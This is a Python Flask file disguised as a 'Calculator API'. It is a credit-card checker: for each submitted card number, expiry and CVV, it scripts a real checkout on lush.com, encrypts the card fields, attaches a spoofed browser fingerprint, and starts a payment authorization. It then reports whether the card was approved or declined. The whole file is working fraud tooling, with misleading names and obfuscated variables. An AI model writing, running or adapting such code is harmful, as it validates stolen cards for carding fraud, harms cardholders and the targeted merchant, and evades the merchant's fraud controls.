import requests,json,urllib3,time,os,base64,pytz
from datetime import datetime
from os import urandom
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route("/")
def home():
    return jsonify({"message": "Calculator API is running"})


urllib3.disable_warnings()
yazıklanmcqueen="10001|BAC4B89E057DFB9686E438E8EB83B7FB554E1B7BDEF9308EB3B878D7896197C7D0BDA57ED85298760E6C47741E21A510732F2537F89E8AD99CDBCB9132B704FDB8D1D5432B14AAD24E342CEBB0C23D8A268CBFAAEB6FDAEB5CD3C3184089087B576417C807464B56534101C0CE9F72ADD1A8BE3608D3BC1203AF2800113679BCC1CE156CF9835EA8C01B33F9C7838002AFE753AD1DE51D1B5B304EAF68DF5C707E831876E9A5D094DF242B80110EFB923C4807FB4BBF2026A09ABEB6AFE885E22E066AE7931B5EE62AF97D7C69FB539F2A72624ECECECFEEE2008FD2C77C3CAF5E017493F97D43305971891F12A709C023EE2A6910DF94D2D94B3BF25418A50D"
class z:
 def __init__(self,u):self.u=u;self.g='1'
 def f(self,i,B,p,T):
  l={'number':i,'cvc':B,'expiryMonth':p,'expiryYear':T};k={}
  for Z,A in l.items():
   if A:I={Z:str(A).strip(),'generationtime':datetime.now(tz=pytz.timezone('UTC')).strftime('%Y-%m-%dT%H:%M:%S.000Z')};k[Z]=self.x(I)
  return k
 def x(self,I):
  B={"alg":"RSA-OAEP","enc":"A256GCM","version":self.g};b=json.dumps(B,sort_keys=True,separators=(',',':'));t=base64.urlsafe_b64encode(b.encode('utf-8')).rstrip(b'=').decode('ascii');m=AESGCM.generate_key(bit_length=256);v=self.u.split("|");H=rsa.RSAPublicNumbers(int(v[0],16),int(v[1],16)).public_key(default_backend());s=H.encrypt(m,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()),algorithm=hashes.SHA1(),label=None));N=urandom(12);G=AESGCM(m);V=G.encrypt(N,json.dumps(I,sort_keys=True,separators=(',',':')).encode('utf-8'),t.encode('ascii'));j,a=V[:-16],V[-16:]
  return '.'.join((t,base64.urlsafe_b64encode(s).rstrip(b'=').decode('ascii'),base64.urlsafe_b64encode(N).rstrip(b'=').decode('ascii'),base64.urlsafe_b64encode(j).rstrip(b'=').decode('ascii'),base64.urlsafe_b64encode(a).rstrip(b'=').decode('ascii')))
def farkederlibabanlaaa(i,p,T,B):
 farkederli=requests.Session()
 farkederlibabanla="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
 arisune="https://www.lush.com/api/basket/create"
 arisunebabanla={"channel":"us","language":"EN_US","quantity":1,"variantId":"UHJvZHVjdFZhcmlhbnQ6NTYxNTM=","line":{}}
 m={'User-Agent':farkederlibabanla,'Accept-Encoding':"gzip, deflate, br, zstd",'Content-Type':"text/plain;charset=UTF-8",'sec-ch-ua-platform':"\"Windows\"",'accept-language':"tr-TR,tr;q=0.9",'origin':"https://www.lush.com",'sec-fetch-site':"same-origin",'sec-fetch-mode':"cors",'sec-fetch-dest':"empty",'referer':"https://www.lush.com/us/en_us/p/turtley-awesome-lokta-paper"}
 U=farkederli.post(arisune,json=arisunebabanla,headers=m,verify=False)
 try:D=U.json();b=D["checkoutId"]
 except:return {"error":"e"}
 f="https://checkout.lush.com/api/wyvern"
 l={'User-Agent':farkederlibabanla,'Accept-Encoding':"gzip, deflate, br, zstd",'Content-Type':"application/json",'sec-ch-ua-platform':"\"Windows\"",'x-lush-client-version':"5.7.6",'accept-language':"tr-TR,tr;q=0.9",'x-lush-client-name':"WEB",'origin':"https://checkout.lush.com",'sec-fetch-site':"same-origin",'sec-fetch-mode':"cors",'sec-fetch-dest':"empty",'referer':"https://checkout.lush.com/us/en_us"}
 o=[
  {"operationName":"GetSettingsPage","variables":{"slug":"settings-us","languageCode":"EN_US"},"query":"query GetSettingsPage($id: ID, $slug: String, $languageCode: LanguageCodeEnum!) {\n  page(id: $id, slug: $slug) {\n    attributes {\n      attribute {\n        name\n        id\n        slug\n        inputType\n        __typename\n      }\n      values {\n        name\n        id\n        slug\n        boolean\n        reference\n        richText\n        translation(languageCode: $languageCode) {\n          id\n          name\n          richText\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}"},
  {"operationName":"GetChannelByCode","variables":{"channel":"us"},"query":"query GetChannelByCode($channel: String!) {\n  channelByCode(channel: $channel) {\n    config {\n      displayTax\n      calculatePricingOnNet\n      personalisedLabels\n      __typename\n    }\n    clubConfig {\n      rewards {\n        enabled\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}"},
  {"operationName":"checkoutShippingAddressUpdate","variables":{"languageCode":"EN_US","channelAddress":{"country":"US"},"id":b,"shippingAddress":{"city":"ZVoHFZ","companyName":"vCtGR","country":"US","countryArea":"NY","firstName":"MKTxB","lastName":"uGpiE","phone":"+15592129924","postalCode":"50624","streetAddress1":"YvoSqJcBDb","streetAddress2":""}},"query":"mutation checkoutShippingAddressUpdate($id: ID!, $shippingAddress: AddressInput!, $languageCode: LanguageCodeEnum!, $channelAddress: AddressInput!) {\n  checkoutShippingAddressUpdate(id: $id, shippingAddress: $shippingAddress) {\n    checkout {\n      ...CheckoutFields\n      __typename\n    }\n    errors {\n      message\n      field\n      code\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment MoneyFields on Money {\n  currency\n  amount\n  __typename\n}\n\nfragment AddressFields on Address {\n  id\n  firstName\n  lastName\n  companyName\n  streetAddress1\n  streetAddress2\n  city\n  cityArea\n  postalCode\n  country {\n    code\n    country\n    __typename\n  }\n  countryArea\n  phone\n  isDefaultShippingAddress\n  isDefaultBillingAddress\n  __typename\n}\n\nfragment MetadataItemFields on MetadataItem {\n  key\n  value\n  __typename\n}\n\nfragment ShippingMethodFields on ShippingMethod {\n  id\n  name\n  description\n  price {\n    ...MoneyFields\n    __typename\n  }\n  type\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    __typename\n  }\n  maximumDeliveryDays\n  minimumDeliveryDays\n  message\n  active\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  __typename\n}\n\nfragment WarehouseFields on Warehouse {\n  id\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  name\n  slug\n  email\n  clickAndCollectOption\n  address {\n    ...AddressFields\n    __typename\n  }\n  __typename\n}\n\nfragment TaxedMoneyFields on TaxedMoney {\n  currency\n  gross {\n    ...MoneyFields\n    __typename\n  }\n  tax {\n    ...MoneyFields\n    __typename\n  }\n  net {\n    ...MoneyFields\n    __typename\n  }\n  __typename\n}\n\nfragment VariantPricingFields on VariantPricingInfo {\n  onSale\n  price {\n    ...TaxedMoneyFields\n    __typename\n  }\n  priceUndiscounted {\n    ...TaxedMoneyFields\n    __typename\n  }\n  __typename\n}\n\nfragment SelectedAttributeFields on SelectedAttribute {\n  attribute {\n    name\n    id\n    slug\n    inputType\n    __typename\n  }\n  values {\n    name\n    id\n    slug\n    richText\n    boolean\n    translation(languageCode: $languageCode) {\n      id\n      name\n      richText\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ProductVariantFields on ProductVariant {\n  id\n  name\n  sku\n  quantityAvailable\n  digitalQuantityAvailable: quantityAvailable(address: $channelAddress)\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  pricing {\n    ...VariantPricingFields\n    __typename\n  }\n  attributes {\n    ...SelectedAttributeFields\n    __typename\n  }\n  __typename\n}\n\nfragment ProductFields on Product {\n  id\n  name\n  slug\n  description\n  seoDescription\n  seoTitle\n  isAvailableForPurchase\n  isAvailable\n  availableForPurchase\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    seoDescription\n    seoTitle\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  productType {\n    hasVariants\n    slug\n    name\n    __typename\n  }\n  thumbnail {\n    url\n    alt\n    __typename\n  }\n  images {\n    id\n    alt\n    url\n    thumbnail: url(size: 100)\n    __typename\n  }\n  category {\n    id\n    name\n    __typename\n  }\n  collections {\n    id\n    name\n    __typename\n  }\n  attributes {\n    ...SelectedAttributeFields\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutLineFields on CheckoutLine {\n  id\n  rewardType: metafield(key: \"reward_type\")\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  quantity\n  undiscountedTotalPrice {\n    ...MoneyFields\n    __typename\n  }\n  unitPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  totalPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  variant {\n    ...ProductVariantFields\n    product {\n      ...ProductFields\n      variants {\n        ...ProductVariantFields\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutFields on Checkout {\n  id\n  rewardDiscountAmount: metafield(key: \"reward_discount_amount\")\n  rewardID: metafield(key: \"reward_id\")\n  rewardType: metafield(key: \"reward_type\")\n  created\n  chargeStatus\n  updatedAt\n  token\n  quantity\n  email\n  channel {\n    id\n    slug\n    __typename\n  }\n  isShippingRequired\n  voucherCode\n  discountName\n  discount {\n    ...MoneyFields\n    __typename\n  }\n  billingAddress {\n    ...AddressFields\n    __typename\n  }\n  shippingAddress {\n    ...AddressFields\n    __typename\n  }\n  shippingMethod {\n    ...ShippingMethodFields\n    __typename\n  }\n  shippingMethods {\n    ...ShippingMethodFields\n    __typename\n  }\n  availableCollectionPoints {\n    ...WarehouseFields\n    __typename\n  }\n  deliveryMethod {\n    ...WarehouseFields\n    __typename\n  }\n  availablePaymentGateways {\n    name\n    id\n    config {\n      value\n      field\n      __typename\n    }\n    __typename\n  }\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  lines {\n    ...CheckoutLineFields\n    __typename\n  }\n  shippingPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  subtotalPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  totalPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  __typename\n}"}]
 G=farkederli.post(f,json=o,headers=l,verify=False)
 E=[
  {"operationName":"checkoutDeliveryMethodUpdate","variables":{"languageCode":"EN_US","channelAddress":{"country":"US"},"id":b,"deliveryMethodId":"U2hpcHBpbmdNZXRob2Q6ODAz"},"query":"mutation checkoutDeliveryMethodUpdate($id: ID!, $deliveryMethodId: ID, $languageCode: LanguageCodeEnum!, $channelAddress: AddressInput!) {\n  checkoutDeliveryMethodUpdate(id: $id, deliveryMethodId: $deliveryMethodId) {\n    checkout {\n      ...CheckoutFields\n      __typename\n    }\n    errors {\n      message\n      field\n      code\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment MoneyFields on Money {\n  currency\n  amount\n  __typename\n}\n\nfragment AddressFields on Address {\n  id\n  firstName\n  lastName\n  companyName\n  streetAddress1\n  streetAddress2\n  city\n  cityArea\n  postalCode\n  country {\n    code\n    country\n    __typename\n  }\n  countryArea\n  phone\n  isDefaultShippingAddress\n  isDefaultBillingAddress\n  __typename\n}\n\nfragment MetadataItemFields on MetadataItem {\n  key\n  value\n  __typename\n}\n\nfragment ShippingMethodFields on ShippingMethod {\n  id\n  name\n  description\n  price {\n    ...MoneyFields\n    __typename\n  }\n  type\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    __typename\n  }\n  maximumDeliveryDays\n  minimumDeliveryDays\n  message\n  active\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  __typename\n}\n\nfragment WarehouseFields on Warehouse {\n  id\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  name\n  slug\n  email\n  clickAndCollectOption\n  address {\n    ...AddressFields\n    __typename\n  }\n  __typename\n}\n\nfragment TaxedMoneyFields on TaxedMoney {\n  currency\n  gross {\n    ...MoneyFields\n    __typename\n  }\n  tax {\n    ...MoneyFields\n    __typename\n  }\n  net {\n    ...MoneyFields\n    __typename\n  }\n  __typename\n}\n\nfragment VariantPricingFields on VariantPricingInfo {\n  onSale\n  price {\n    ...TaxedMoneyFields\n    __typename\n  }\n  priceUndiscounted {\n    ...TaxedMoneyFields\n    __typename\n  }\n  __typename\n}\n\nfragment SelectedAttributeFields on SelectedAttribute {\n  attribute {\n    name\n    id\n    slug\n    inputType\n    __typename\n  }\n  values {\n    name\n    id\n    slug\n    richText\n    boolean\n    translation(languageCode: $languageCode) {\n      id\n      name\n      richText\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ProductVariantFields on ProductVariant {\n  id\n  name\n  sku\n  quantityAvailable\n  digitalQuantityAvailable: quantityAvailable(address: $channelAddress)\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  pricing {\n    ...VariantPricingFields\n    __typename\n  }\n  attributes {\n    ...SelectedAttributeFields\n    __typename\n  }\n  __typename\n}\n\nfragment ProductFields on Product {\n  id\n  name\n  slug\n  description\n  seoDescription\n  seoTitle\n  isAvailableForPurchase\n  isAvailable\n  availableForPurchase\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    seoDescription\n    seoTitle\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  productType {\n    hasVariants\n    slug\n    name\n    __typename\n  }\n  thumbnail {\n    url\n    alt\n    __typename\n  }\n  images {\n    id\n    alt\n    url\n    thumbnail: url(size: 100)\n    __typename\n  }\n  category {\n    id\n    name\n    __typename\n  }\n  collections {\n    id\n    name\n    __typename\n  }\n  attributes {\n    ...SelectedAttributeFields\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutLineFields on CheckoutLine {\n  id\n  rewardType: metafield(key: \"reward_type\")\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  quantity\n  undiscountedTotalPrice {\n    ...MoneyFields\n    __typename\n  }\n  unitPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  totalPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  variant {\n    ...ProductVariantFields\n    product {\n      ...ProductFields\n      variants {\n        ...ProductVariantFields\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutFields on Checkout {\n  id\n  rewardDiscountAmount: metafield(key: \"reward_discount_amount\")\n  rewardID: metafield(key: \"reward_id\")\n  rewardType: metafield(key: \"reward_type\")\n  created\n  chargeStatus\n  updatedAt\n  token\n  quantity\n  email\n  channel {\n    id\n    slug\n    __typename\n  }\n  isShippingRequired\n  voucherCode\n  discountName\n  discount {\n    ...MoneyFields\n    __typename\n  }\n  billingAddress {\n    ...AddressFields\n    __typename\n  }\n  shippingAddress {\n    ...AddressFields\n    __typename\n  }\n  shippingMethod {\n    ...ShippingMethodFields\n    __typename\n  }\n  shippingMethods {\n    ...ShippingMethodFields\n    __typename\n  }\n  availableCollectionPoints {\n    ...WarehouseFields\n    __typename\n  }\n  deliveryMethod {\n    ...WarehouseFields\n    __typename\n  }\n  availablePaymentGateways {\n    name\n    id\n    config {\n      value\n      field\n      __typename\n    }\n    __typename\n  }\n  metadata {\n    ...MetadataItemFields\n    __typename\n  }\n  lines {\n    ...CheckoutLineFields\n    __typename\n  }\n  shippingPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  subtotalPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  totalPrice {\n    ...TaxedMoneyFields\n    __typename\n  }\n  __typename\n}"}]
 t=farkederli.post(f,json=E,headers=l,verify=False)
 c=13
 try:
  R=t.json()
  if isinstance(R,list) and len(R)>0:
   d=R[0].get("data",{}).get("checkoutDeliveryMethodUpdate",{}).get("checkout",{}).get("totalPrice",{}).get("gross",{}).get("amount")
   if d:c=d
 except:pass
 g=z(yazıklanmcqueen)
 J=g.f(i,B,p,T)
 S="https://checkout.lush.com/api/checkout/initialize-transaction"
 if i.startswith("4"):r="visa"
 elif i.startswith("5") or i.startswith("2"):r="mc"
 elif i.startswith("3"):r="amex"
 elif i.startswith("6"):r="discover"
 else:r="visa"
 K={"id":b,"data":{"riskData":{"clientData":"eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6IkRwcXdVNHpFZE4wMDUwMDAwMDAwMDAwMDAweFpYZHVlSW94VzAwNDMwMDY0OTZjVkI5NGlLekJHa05xbFVXQkNhZEJpeDdSWDNhejgwMDJ2M1lkak5QRDRXMDAwMDBxWmtURTAwMDAwYjRZMjZGZ1JVRDUwR05RMHI4U2I6NDAiLCJwZXJzaXN0ZW50Q29va2llIjpbIl9ycF91aWQ9YTZhYjgwNTAtOGU1Zi0xMDY5LTBjZTUtOGNmMmRmNWU4NDNmIl0sImNvbXBvbmVudHMiOnsidXNlckFnZW50IjoiMjQ2Mzg3MGIyNmU2OWE1YmRhMzY2Y2U2NTc0YjFjODgiLCJ3ZWJkcml2ZXIiOjAsImxhbmd1YWdlIjoidHItVFIiLCJjb2xvckRlcHRoIjozMiwiZGV2aWNlTWVtb3J5IjoxNiwicGl4ZWxSYXRpbyI6MS4yNSwiaGFyZHdhcmVDb25jdXJyZW5jeSI6MTIsInNjcmVlbldpZHRoIjo4NjQsInNjcmVlbkhlaWdodCI6MTUzNiwiYXZhaWxhYmxlU2NyZWVuV2lkdGgiOjgxNiwiYXZhaWxhYmxlU2NyZWVuSGVpZ2h0IjoxNTM2LCJ0aW1lem9uZU9mZnNldCI6LTE4MCwidGltZXpvbmUiOiJFdXJvcGUvSXN0YW5idWwiLCJzZXNzaW9uU3RvcmFnZSI6MSwibG9jYWxTdG9yYWdlIjoxLCJpbmRleGVkRGIiOjEsImFkZEJlaGF2aW9yIjowLCJvcGVuRGF0YWJhc2UiOjAsInBsYXRmb3JtIjoiV2luMzIiLCJwbHVnaW5zIjoiMjljZjcxZTNkODFkNzRkNDNhNWIwZWI3OTQwNWJhODciLCJjYW52YXMiOiJiNTVlNWQ3YmExMTk4MmM1ZDc4MjdmMzY5ZTliMjI1NyIsIndlYmdsIjoiM2ZmYzM4NTAwNDkzZGYzNjJjZTkxODFjODJlZGEzYmYiLCJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyIjoiR29vZ2xlIEluYy4gKEludGVsKX5BTkdMRSAoSW50ZWwsIEludGVsKFIpIFVIRCBHcmFwaGljcyAoMHgwMDAwQTdBOCkgRGlyZWN0M0QxMSB2c181XzAgcHNfNV8wLCBEM0QxMSkiLCJhZEJsb2NrIjowLCJoYXNMaWVkTGFuZ3VhZ2VzIjowLCJoYXNMaWVkUmVzb2x1dGlvbiI6MCwiaGFzTGllZE9zIjowLCJoYXNMaWVkQnJvd3NlciI6MCwiZm9udHMiOiI0MWMzN2VlN2EyNzE1MmVkOGZhNGIzZTZmMjM0OGIxYiIsImF1ZGlvIjoiOTAyZjBmZTk4NzE5Yjc3OWVhMzdmMjc1MjhkZmIwYWEiLCJlbnVtZXJhdGVEZXZpY2VzIjoiNWYzZmRhZjQ3NDNlYWE3MDdjYTZiN2RhNjU2MDM4OTIiLCJ2aXNpdGVkUGFnZXMiOltdLCJiYXR0ZXJ5SW5mbyI6eyJiYXR0ZXJ5TGV2ZWwiOjEwMCwiYmF0dGVyeUNoYXJnaW5nIjp0cnVlfSwiYm90RGV0ZWN0b3JzIjp0cnVlLCJoZWFkbGVzc0Jyb3dzZXIiOmZhbHNlLCJub0xhbmd1YWdlcyI6ZmFsc2UsImluY29uc2lzdGVudEV2YWwiOmZhbHNlLCJpbmNvbnNpc3RlbnRQZXJtaXNzaW9ucyI6ZmFsc2UsImRvbU1hbmlwdWxhdGlvbiI6ZmFsc2UsImFwcFZlcnNpb25TdXNwaWNpb3VzIjpmYWxzZSwiZnVuY3Rpb25CaW5kU3VzcGljaW91cyI6dHJ1ZSwiYm90SW5Vc2VyQWdlbnQiOmZhbHNlLCJ3aW5kb3dTaXplU3VzcGljaW91cyI6ZmFsc2UsImJvdEluV2luZG93RXh0ZXJuYWwiOmZhbHNlLCJ3ZWJHTCI6ZmFsc2V9fX0="},"paymentMethod":{"type":"scheme","holderName":"Sdhle yxZoI","encryptedCardNumber":J["number"],"encryptedExpiryMonth":J["expiryMonth"],"encryptedExpiryYear":J["expiryYear"],"encryptedSecurityCode":J["cvc"],"brand":r,"checkoutAttemptId":"fetch-checkoutAttemptId-failed"},"browserInfo":{"acceptHeader":"*/*","colorDepth":32,"language":"tr-TR","javaEnabled":False,"screenHeight":864,"screenWidth":1536,"userAgent":farkederlibabanla,"timeZoneOffset":-180},"origin":"https://checkout.lush.com","clientStateDataIndicator":True,"returnUrl":f"https://checkout.lush.com/us/en_us/receipt?checkout={b}"},"amount":c,"action":"AUTHORIZATION"}
 L=farkederli.post(S,json=K,headers=l,verify=False)
 try:
  A=L.json();V=A.get("data",{}).get("transactionInitialize",{});s=V.get("transactionEvent",{});Q=V.get("data",{}).get("paymentResponse",{});Z=s.get("type","");C=Q.get("resultCode","Unknown");x=Q.get("refusalReason","N/A");M=Q.get("refusalReasonCode","N/A")
  if C=="Unknown":
   q=V.get("data",{}).get("errors",[])
   if q and len(q)>0:C=q[0].get("code","Unknown");x=q[0].get("message","N/A");M=q[0].get("details",{}).get("errorCode","N/A")
  h=(Z!="AUTHORIZATION_FAILURE")
  return {"resultCode":C,"refusalReason":x,"refusalReasonCode":M,"success":h}
 except Exception as n:return {"error":str(n),"success":False,"raw":L.text}





@app.route("/calc", methods=["GET"])
def chk():
    # قراءة المتغير
    O = request.args.get("cc")

    if not O:
        return "Missing parameter: cc", 400

    Y = O.split("|")

    if len(Y) < 4:
        return "Invalid format. Use: number|month|year|cvv", 400

    X = Y[0]
    W = Y[1]
    I = Y[2]
    F = Y[3]

    # تحويل السنة إذا كانت بصيغة YY
    if len(I) == 2:
        I = "20" + I

    try:
        y = farkederlibabanlaaa(X, W, I, F)
    except Exception as e:
        return f"Error: {e}", 500

    if not isinstance(y, dict):
        return "Invalid response from checker", 500

    if "error" in y:
        return str(y["error"]), 400

    k = "Approved" if y.get("success") else "Declined"

    return (
        f"{k} - {O} - "
        f"{y.get('refusalReason', '')} - "
        f"{y.get('resultCode', '')} - "
        f"{y.get('refusalReasonCode', '')}"
    )


# لتشغيله محليًا
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)